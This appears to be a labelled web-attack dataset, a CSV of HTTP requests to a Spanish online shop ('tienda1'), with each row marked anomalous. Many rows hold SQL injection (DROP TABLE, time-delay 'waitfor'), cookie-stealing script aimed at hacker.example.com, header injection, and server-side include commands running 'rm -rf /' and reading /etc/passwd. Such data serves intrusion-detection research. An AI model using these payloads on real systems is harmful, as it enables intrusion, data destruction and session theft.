request,classification
/tienda1/publico/autenticar.jsp /modo=entrar&login=libbey&pwd=141c1U01%27OR%27a%3D%27a&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=libbey&pwd=%253F&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=libbey&pwd=dis%2F%27ant%2Co&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=libbey&pwd=141c1U01&remember=on&B1A=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=2%22+AND+%221%22%3D%221,1
/tienda1/publico/caracteristicas.jsp /id=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectas,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=2939&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&precio=2939&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=2939&B1=Pasar+por+caja%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=2939&B1A=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=draper&password=empol721ar&nombre=Mercur-io&apellidos=San+Emeterio+Farzati&email=redfield-eckstine%40sorority.va&dni=51229909P&direccion=C%2F+Marte+50+3%3FH&ciudad=Salda%F1a&cp=37172&provincia=Ja%E9n&ntc=6892387186647118&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=draper&password=empol721ar&nombre=Jos%E9+Luis&apellidos=San+Emeterio+Farzati&email=redfield-eckstine%40sorority.va&dniA=51229909P&direccion=C%2F+Marte+50+3%3FH&ciudad=Salda%F1a&cp=37172&provincia=Ja%E9n&ntc=6892387186647118&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carritoany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,1
/tienda1/publico/vaciar.jsp /B2=%22+AND+%221%22%3D%221,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=Xim%E9nez+Alamo&email=gleaves4%40mauroman.ml&dni=93721450S&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cp=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,1
/tienda1/miembros/editar.jsp /modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=Xim%E9nez+Alamo&email=gleaves4%40mauroman.ml&dni=%27OR%27a%3D%27a&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cp=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=D%2Curazo+Buf%ED&email=gleaves4%40mauroman.ml&dni=93721450S&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cp=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=Xim%E9nez+Alamo&email=gleaves4%40mauroman.ml&dni=93721450S&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cpA=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=3&nombre=Vino+Rioja&precio=39&cantidad=34sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=39&cantidad=34&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Vino+Rioja&precioA=39&cantidad=34&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=boeyenany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&pwd=13st7l75n&remember=off&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&loginA=boeyen&pwd=13st7l75n&remember=off&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=2%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/caracteristicas.jsp /id=%2500,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsg=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1517any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Confirmar,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1517&B1=Pasar+por+caja%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1517&B1A=Confirmar,1
/tienda1/publico/registro.jsp /modo=registro&login=xi-xian9%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&password=p%3Ferspicacidad&nombre=Geraldo&apellidos=Pedrol&email=chalon%40ingenelec.gl&dni=10207822P&direccion=C%2F+Paloma%2C+197+&ciudad=Laguna+Dalga&cp=47520&provincia=Pontevedra&ntc=3590940446144864&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=xi-xian9&password=p%3Ferspicacidad&nombre=Geraldo&apellidos=Pedrol&email=chalon%40ingenelec.gl&dni=10207822P&direccion=C%2F+Paloma%2C+197+&ciudad=Laguna+Dalga&cp=47520&provincia=Pontevedra&ntc=331994682613323&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=xi-xian9&password=p%3Ferspicacidad&nombre=Geraldo&apellidos=Pedrol&email=chalon%40ingenelec.gl&dni=10207822P&direccion=C%2F+Paloma%2C+197+&ciudad=Laguna+Dalga&cp=47520&provincia=Pontevedra&ntcA=3590940446144864&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=myrtie&password=9uBIleTE&nombre=Aelohim&apellidos=Coria+Echecopar&email=bonnafe%40prensahp.mn&dni=12879968Z&direccion=C%2F+Vivers+102+&ciudad=Moralina&cp=24288&provincia=Cue%2Fnc..a&ntc=0201643055570272&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=myrtie&password=9uBIleTE&nombre=Aelohim&apellidos=Coria+Echecopar&email=bonnafe%40prensahp.mn&dni=12879968Z&direccion=C%2F+Vivers+102+&ciudadA=Moralina&cp=24288&provincia=Madrid&ntc=0201643055570272&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=1&nombre=Queso+Manchego&precio=39paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&cantidad=64&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3%2F&nombre=Queso+Manchego&precio=39&cantidad=64&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=1&nombre=Queso+Manchego&precioA=39&cantidad=64&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=mile&pwd=DEs9I852d268%253F&remember=off&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=mile&pwd=DEs9I852d268&remember=on%2F&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=mile&pwd=DEs9I852d268&rememberA=off&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectas,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=2408&B1=Pasar+por+caja%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=2408&B1A=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=yokono5&password=8e6d77ador9&nombre=Vince%2Bnt&apellidos=Gochez&email=mott%40hostprofessional.ma&dni=17879103F&direccion=Calle+Nu%F1ez+De+Guzman+24%2C+&ciudad=Carcedo+de+Bureba&cp=50217&provincia=Murcia&ntc=2770286636013280&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=yokono5&password=8e6d77ador9&nombre=Gisberto&apellidos=Gochez&email=mott%40hostprofessional.ma&dni=17879103F&direccion=Calle+Nu%F1ez+De+Guzman+24%2C+&ciudad=Carcedo+de+Bureba&cp=50217&provincia=Murcia&ntcA=2770286636013280&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carritosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=ofilia&password=santurr%F3n&nombre=Lauran&apellidos=Tonk+Carrizales&email=engel%40longboarders.cu&dni=03303370H&direccion=Plza.+Juan+Zorrilla%2C+107+9%3FF&ciudad=Bruc%2C+El&cp=28522&provincia=Granada&ntc=1816581279872417&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=ofilia&password=santurr%F3n&nombre=Lauran&apellidos=Tonk+Carrizales&email=engel%40longboarders.cu&dni=17B088362Y&direccion=Plza.+Juan+Zorrilla%2C+107+9%3FF&ciudad=Bruc%2C+El&cp=28522&provincia=Granada&ntc=1816581279872417&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=ofilia&password=santurr%F3n&nombre=Lauran&apellidosA=Tonk+Carrizales&email=engel%40longboarders.cu&dni=03303370H&direccion=Plza.+Juan+Zorrilla%2C+107+9%3FF&ciudad=Bruc%2C+El&cp=28522&provincia=Granada&ntc=1816581279872417&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=1&nombre=Vino+Rioja&precio=39&cantidad=77%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3%2F&nombre=Vino+Rioja&precio=39&cantidad=77&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=frants&pwd=c222Lib6T912&remember=on&B1=Entrarparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=frants&pwd=clor%2F%EDTIca&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=frants&pwdA=c222Lib6T912&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=1any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/caracteristicas.jsp /id=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,1
/tienda1/publico/entrar.jsp /errorMsg=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&precio=5191&B1=Confirmar,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5191&B1=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5191&B1=Confirmar%2F,1
/tienda1/publico/registro.jsp /modo=registro&login=prashant&password=l1n1sa&nombre=Grey&apellidos=Montaner+Espinosa&email=gempart.moor%40guejosgratis.br&dni=27979477T&direccion=Cavad*on+49%2C+%2B12H&ciudad=Collbat%F3&cp=17180&provincia=Girona&ntc=7582936564650481&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&loginA=prashant&password=l1n1sa&nombre=Grey&apellidos=Montaner+Espinosa&email=gempart.moor%40guejosgratis.br&dni=27979477T&direccion=Calle+La+Le%F1a+27+&ciudad=Collbat%F3&cp=17180&provincia=Girona&ntc=7582936564650481&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=suat&password=PuerTA1enTAnA&nombre=Isis&apellidos=Piera+Atencia&email=cerini.ban%40g%402horas.coop&dni=23679741E&direccion=Calle+Torre+Dels+Socors+29%2C+11%3FE&ciudad=Quiruelas+de+Vidriales&cp=34419&provincia=Burgos&ntc=0825075702605085&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=suat&password=PuerTA1enTAnA&nombre=Isis&apellidos=Piera+Atencia&email=vinci%40espaciodelpintor.ic&dni=23679741E&direccion=Calle+Torre+Dels+Socors+29%2C+11%3FE&ciudad=Quiruelas+de+Vidriales&cpA=34419&provincia=Burgos&ntc=0825075702605085&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=17&B1=A%F1adir+al+carritoSet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico&precio=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cantidad=17&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=17&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=17&B1A=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=mc&pwd=cerverano&remember=off%2F&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=mc&pwd=cerverano&remember=on&B1A=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=2%27OR%27a%3D%27a,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsg=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/registro.jsp /modo=registro&login=ivanyi0&password=va7e9ianato&nombre=Crescencio&apellidos=Echevarr%EDa+Borras&email=tadio.bixby%40espaciopintor.eh&dni=98763423C&direccion=Torrent+De+Can+Quintana%2C+179%2C+&ciudad=Llocnou+de+la+Corona&cp=49430%2B&provincia=Lleida&ntc=8110791105529474&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=ivanyi0&password=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Crescencio&apellidos=Echevarr%EDa+Borras&email=tadio.bixby%40espaciopintor.eh&dni=98763423C&direccion=Torrent+De+Can+Quintana%2C+179%2C+&ciudad=Llocnou+de+la+Corona&cp=49430&provincia=Lleida&ntc=8110791105529474&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=ivanyi0&password=va7e9ianato&nombre=Ve*%2Cr%2Bna&apellidos=Echevarr%EDa+Borras&email=tadio.bixby%40espaciopintor.eh&dni=98763423C&direccion=Torrent+De+Can+Quintana%2C+179%2C+&ciudad=Llocnou+de+la+Corona&cp=49430&provincia=Lleida&ntc=8110791105529474&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=ivanyi0&password=va7e9ianato&nombre=Crescencio&apellidos=Echevarr%EDa+Borras&email=tadio.bixby%40espaciopintor.eh&dni=98763423C&direccion=Torrent+De+Can+Quintana%2C+179%2C+&ciudad=Llocnou+de+la+Corona&cp=49430&provincia=Lleida&ntcA=8110791105529474&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=daesik2&password=24%ED58ca1e581&nombre=Panciano&apellidos=Bonitto+Ciraco&email=dorsay.thursby%40elrincondelmarmol.pr&dni=51834543H%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&direccion=Cabo+De+Agua%2C+S%2FN+&ciudad=Villafranca+de+los+Barros&cp=21240&provincia=Ja%E9n&ntc=8319637256237029&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=daesik2&password=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Panciano&apellidos=Bonitto+Ciraco&email=dorsay.thursby%40elrincondelmarmol.pr&dni=51834543H&direccion=Cabo+De+Agua%2C+S%2FN+&ciudad=Villafranca+de+los+Barros&cp=21240&provincia=Ja%E9n&ntc=8319637256237029&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=daesik2&password=24%ED58ca1e581&nombre=Panciano&apellidos=Masc%F3+Pr*.ado&email=dorsay.thursby%40elrincondelmarmol.pr&dni=51834543H&direccion=Cabo+De+Agua%2C+S%2FN+&ciudad=Villafranca+de+los+Barros&cp=21240&provincia=Ja%E9n&ntc=8319637256237029&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=daesik2&password=24%ED58ca1e581&nombre=Panciano&apellidos=Bonitto+Ciraco&email=dorsay.thursby%40elrincondelmarmol.pr&dni=51834543H&direccion=Cabo+De+Agua%2C+S%2FN+&ciudad=Villafranca+de+los+Barros&cp=21240&provincia=Ja%E9n&ntc=8319637256237029&B1A=Registrar,1
/tienda1/publico/anadir.jsp /id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=71&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=1&nombre=Queso+Manchego&precio=39&cantidad=71&B1A=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=lemaire&pwd=6abe934&remember=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=guo%27chun&pwd=6abe934&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&loginA=lemaire&pwd=6abe934&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=1%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectas,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectas%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,1
/tienda1/publico/entrar.jsp /errorMsg=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=65any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=65&B1=Pasar+por+caja%2F,1
/tienda1/publico/registro.jsp /modo=registro&login=renato&password=DID%E1CtiCaMente&nombre=Favio&apellidos=Gilabert&email=frisco_tretow%40citiway.ec&dni=79332852X&direccion=Calle+Los+Perez+117%2C+&ciudad=Aguasal&cp=15881&provincia=Badajoz&ntc=5960331754539682&B1=Registrar%2520,1
/tienda1/publico/registro.jsp /modo=registro&login=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&password=DID%E1CtiCaMente&nombre=Favio&apellidos=Gilabert&email=frisco_tretow%40citiway.ec&dni=79332852X&direccion=Calle+Los+Perez+117%2C+&ciudad=Aguasal&cp=15881&provincia=Badajoz&ntc=5960331754539682&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=renato&password=DID%E1CtiCaMente&nombre=Favio&apellidos=C%E1rcamo+M%2Coj%2Bi-ca&email=frisco_tretow%40citiway.ec&dni=79332852X&direccion=Calle+Los+Perez+117%2C+&ciudad=Aguasal&cp=15881&provincia=Badajoz&ntc=5960331754539682&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=renato&password=DID%E1CtiCaMente&nombre=Favio&apellidosA=Gilabert&email=frisco_tretow%40citiway.ec&dni=79332852X&direccion=Calle+Los+Perez+117%2C+&ciudad=Aguasal&cp=15881&provincia=Badajoz&ntc=5960331754539682&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carritoany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro%2B&login=jyoti&password=dechado&nombre=Tercero&apellidos=Bori+Raich&email=varhelyi_krzyzewska%40santacruzdelvoto.mw&dni=87721362Y&direccion=Dulcinea%2C+158%2C+4%3FG&ciudad=Valverde+del+Camino&cp=19190&provincia=Cuenca&ntc=4412645005602081&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=jyoti&password=dechado&nombre=Alcui.%2Fno&apellidos=Bori+Raich&email=varhelyi_krzyzewska%40santacruzdelvoto.mw&dni=87721362Y&direccion=Dulcinea%2C+158%2C+4%3FG&ciudad=Valverde+del+Camino&cp=19190&provincia=Cuenca&ntc=4412645005602081&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=jyoti&password=dechado&nombre=Tercero&apellidosA=Bori+Raich&email=varhelyi_krzyzewska%40santacruzdelvoto.mw&dni=87721362Y&direccion=Dulcinea%2C+158%2C+4%3FG&ciudad=Valverde+del+Camino&cp=19190&provincia=Cuenca&ntc=4412645005602081&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=3%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&nombre=Vino+Rioja&precio=100&cantidad=56&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Vino+Rioja&precio=85%2F&cantidad=56&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Vino+Rioja&precio=100&cantidadA=56&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=thisner9&pwd=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&remember=off&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=thisner9&pwd=tanganillas&remember=off%2F&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modoA=entrar&login=thisner9&pwd=tanganillas&remember=off&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectasany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,1
/tienda1/publico/entrar.jsp /errorMsg=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=8865&B1=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/registro.jsp /modo=registro&login=teena&password=EnraNCiAR&nombre=Julio&apellidos=Guardiol+Sim%F3&email=heuser%40prensahp.mx&dni=31293475C&direccion=Calle+Rejas%2C+23%2C+4%3FB&ciudad=Montiel&cp=08183&provincia=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&ntc=5996994438589439&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=teena&password=EnraNCiAR&nombre=Julio&apellidos=Guardiol+Sim%F3&email=heuser%40prensahp.mx&dni=31293475C&direccion=Calle+Rejas%2C+23%2C+4%3FB&ciudad=Montiel&cp=08183&provincia=Guadalajara&ntc=315877120463864&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=teena&password=EnraNCiAR&nombre=Julio&apellidos=Guardiol+Sim%F3&email=heuser%40prensahp.mx&dni=31293475C&direccionA=Calle+Rejas%2C+23%2C+4%3FB&ciudad=Montiel&cp=08183&provincia=Guadalajara&ntc=5996994438589439&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%2B,1
/tienda1/publico/vaciar.jsp /B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=virk&password=latrin5&nombre=Roxana&apellidos=Barbero+Delgados&email=lutz%40ringringcargo.eg&dni=91059337Z&direccion=C%2F+Llucena%2C+193+2H&ciudad=Almu%F1%E9car%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=43248&provincia=Barcelona&ntc=6935592091774249&B1=Registrar,1
